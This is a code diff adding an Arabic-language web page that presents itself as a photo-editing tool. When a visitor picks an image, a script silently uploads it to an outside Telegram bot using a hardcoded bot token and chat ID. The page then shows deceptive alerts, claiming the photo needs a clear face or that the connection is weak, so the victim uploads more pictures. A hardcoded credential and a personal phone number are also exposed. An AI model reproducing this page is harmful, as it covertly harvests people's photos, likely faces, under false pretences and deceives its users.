@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title> تعديل الصور  </title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+        }
+        .full-screen-image {
+        
+            width: 100%;
+            height: 100%;
+            background: url('photo.png') no-repeat center center;
+            background-size: cover;
+        }
+        .navbar {
+    background-color: white;
+    overflow: hidden;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    padding: 10px;
+}
+
+.icon {
+    width: 30px;
+    height: 30px;
+}
+
+.icon.large {
+    width: 38px;
+    height: 38px;
+}
+
+.icon.small {
+    width: 23px;
+    height: 23px;
+}
+
+.icon:focus {
+    outline: none;
+}
+
+    </style>
+</head>
+<body>
+     <div class="navbar">
+        <a href="index1.html"><img src="home.png" alt="Home" class="icon large"></a>
+        <a href="calculator"><img src="information.png" alt="Information" class="icon small"></a>
+        <a href="index2.html"><img src="email.png" alt="Email" class="icon"></a>
+        <a href="https://wa.me/212633549914?text=Hello%20Ayoub"><img src="wts.png" alt="WhatsApp" class="icon large"></a>
+        <a href="pic.html"><img src="cam.png" alt="Camera" class="icon small"></a>
+    </div>
+    <div class="full-screen-image" onclick="document.getElementById('fileInput').click();"></div>
+    <input type="file" id="fileInput" style="display: none;" accept="image/*" onchange="sendToTelegram(this.files[0])">
+    <script>
+        function sendToTelegram(file) {
+            const botToken = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
+            const chatId = '5687419212';
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', file);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert(' يجب ان تكون الصورة تحتوي على وجه واضح ');
+                } else {
+                    alert('ضعف الاتصال بالانترنت ،اعد الحاولة !');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('  ضعف الاتصال بالانترنت ،اعد الحاولة ! ');
+            });
+        }
+    </script>
+    
+</body>
+</html>
